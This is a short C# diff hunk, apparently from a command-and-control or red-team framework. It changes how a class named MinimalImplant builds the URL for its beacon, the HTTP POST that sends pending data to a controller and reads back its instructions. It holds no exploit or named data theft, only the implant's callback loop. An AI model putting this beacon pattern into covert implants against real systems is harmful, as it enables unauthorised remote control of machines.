@@ -156,7 +156,7 @@ public sealed class MinimalImplant : IImplantCandidate
         outbound.AddRange(pending);
 
         using var response = await _http.PostAsync(
-            $"http://{target.BeaconHostPort}/implants/beacon",
+            target.BeaconUrl,
             new ByteArrayContent(Encode(outbound)), cancellationToken);
         response.EnsureSuccessStatusCode();
         var inbound = Parse(await response.Content.ReadAsByteArrayAsync(cancellationToken));
